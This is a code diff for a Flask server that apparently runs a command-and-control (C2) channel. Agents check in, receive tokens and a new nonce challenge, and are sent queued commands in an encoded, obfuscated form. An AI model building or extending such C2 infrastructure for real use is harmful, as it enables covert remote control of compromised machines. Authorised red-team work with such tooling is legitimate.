@@ -169,46 +169,44 @@ def get_order(ops):
     '''
     return [cmd[ops] for cmd in order]
 
+# In server.py - Modified check_in function
 @app.route('/overview', methods=['POST'])
 def check_in():
-    '''
-    function to verify connection to client and send secret keys
-    '''
     try:
         data = request.get_json(force=True)
         aid = data['aid']
         ops = data['ops']
+        client_nonce = data.get('nonce')  # Client challenge
         
-        if not ops:
-            logging.warning("Received invalid os identification command")
-            return jsonify({"error": "Mssing operating system identification"}), 400
+        if not ops or not client_nonce:
+            logging.warning("Invalid check-in data")
+            return jsonify({"error": "Missing required fields"}), 400
         
         checkin_time = time.time()
         token = secrets.token_hex(16)
-
-        # creating a seperate cmd queue for each agent 
+        server_nonce = secrets.token_hex(8)  # Server challenge
+        
+        # Store nonce for verification
         agent_orders[aid] = get_order(ops)
-
         agent_metrics[aid] = {
             'ops': ops,
             'last_checkin': checkin_time,
-            'token': token
+            'token': token,
+            'client_nonce': client_nonce,
+            'server_nonce': server_nonce
         }
-
         token_to_agent[token] = aid
 
-        logging.info(f"Agent '{aid}' with OS '{ops}' checked in at {checkin_time:.2f}. Token issued.")
-
+        # Create response with server challenge
         resp = {
-            'status': 'Success', 
+            'status': 'Success',
             'timestamp': checkin_time,
+            'challenge': server_nonce
         }
 
         response = jsonify(resp)
         response.set_cookie('auth_token', token, httponly=True, secure=True, samesite='Strict')
-
-        return response, 200 
-    
+        return response, 200
     except Exception as e:
         logging.error(f"Error processing agent check-in: {e}")
         return jsonify({"error": "Invalid request format"}), 400
@@ -234,7 +232,6 @@ def c2_endpoint():
             return jsonify({"error": "Invalid token"}), 400
         
         
-        # Record the check-in time for metrics.
         checkin_time = time.time()
         agent_metrics.setdefault((agent_id), {})['last_checkin'] = checkin_time
         logging.info(f"Agent aid={agent_id} checked in at {checkin_time:.2f}")
@@ -250,10 +247,10 @@ def c2_endpoint():
         response = {
             "status": "active",
             "timestamp": checkin_time,
-            "cmd": encoded_command  # The command is delivered in an obfuscated format.
+            "cmd": encoded_command 
         }
         
-        logging.info(f"Dispatched command to agent for stage {stg}: {command_text}")
+        logging.info(f"Dispatched command to agent aid={agent_id} : {command_text}")
         return jsonify(response), 200
 
     except Exception as e:
